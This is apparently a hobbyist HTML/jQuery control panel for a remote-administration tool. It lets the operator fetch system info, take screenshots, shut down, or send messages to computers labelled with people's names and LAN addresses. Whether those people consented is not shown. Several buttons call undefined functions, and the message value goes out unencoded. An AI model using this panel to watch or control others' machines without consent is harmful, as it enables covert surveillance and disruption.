<!DOCTYPE html>
<html>
    <head>
    <meta charset="unicode" />
        <title>Information page</title>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
        <script>
            var so = "";
            String.prototype.replaceAll = function(search, replace){
                return this.split(search).join(replace);
            }
            function getinfo(ip){
                $.ajax({
                    url: "informationport?ip="+ip+"&t=1"
                }).done(function(data) {
                    /*var asd = data.split('|');
                    asd.forEach(function callback(cur,ind,arr){
                        alert(cur);
                    });*/
                    $("#info").text(data);
                });
            }

            function getscreen(ip){
                $.ajax({
                    url: "informationport?ip="+ip+"&t=2"
                }).done(function(data) {
                    //while(data.replace(new RegExp("[\x00-\x1F\x7F]"), "")!= data) data = data.replace(new RegExp("[\x00-\x1F\x7F]"), "");
                    //data = data.substr(0, data.length); sfsdfsdf
                    //Поменял код
                    document.getElementById("image").setAttribute( 'src',  "data:image/png;base64," + data);
                });
            }

            function shutdown(ip){
                $.ajax({
                    url: "informationport?ip="+ip+"&t=3"
                });
            }

            function message(ip){
                $.ajax({
                    url: "informationport?ip="+ip+"&t=4&message="+$("#messageinput").val()
                });
            }
        </script>
    </head>
    <body>
        <input id="messageinput" placeholder="Сообщение" />
        <div>
            <p>local</p>
            <button onClick="getinfo('127.0.0.1')">Информация</button>
            <button onClick="getscreen('127.0.0.1')">Скриншот</button>
            <button onClick="shutdown('127.0.0.1')">Выключить нахуй</button>
            <button onClick="message('127.0.0.1')">Сообщение</button>
        </div>
        <div>
            <p>vitya</p>
            <button onClick="getinfo('192.168.1.39')">Информация</button>
            <button onClick="getscreen('192.168.1.39')">Скриншот</button>
            <button onClick="shutdown('192.168.1.39')">Выключить нахуй</button>
            <button onClick="message('192.168.1.39')">Сообщение</button>
        </div>
        <div>
            <p>Kostyan</p>
            <button onClick="zaprosec('192.168.1.53')">Информация</button>
            <button onClick="zaproscreen('192.168.1.53')">Скриншот</button>
            <button disabled onClick="shutdown('192.168.1.53')">Выключить нахуй</button>
            <button disabled onClick="message('192.168.1.53')">Сообщение</button>
        </div>
        <div>
            <p>vovanja</p>
            <button onClick="zaprosec('192.168.1.58')">Информация</button>
            <button onClick="zaproscreen('192.168.1.58')">Скриншот</button>
            <button onClick="shutdown('192.168.1.58')">Выключить нахуй</button>
            <button onClick="message('192.168.1.58')">Сообщение</button>
        </div>
        <div>
            <p>vitalya</p>
            <button onClick="zaprosec('192.168.1.69')">Информация</button>
            <button onClick="zaproscreen('192.168.1.69')">Скриншот</button>
            <button onClick="shutdown('192.168.1.69')">Выключить нахуй</button>
            <button onClick="message('192.168.1.69')">Сообщение</button>
        </div>
        <p id="info"></p>
        <img id="image" style="max-width: 800px"/>
    </body>
</html>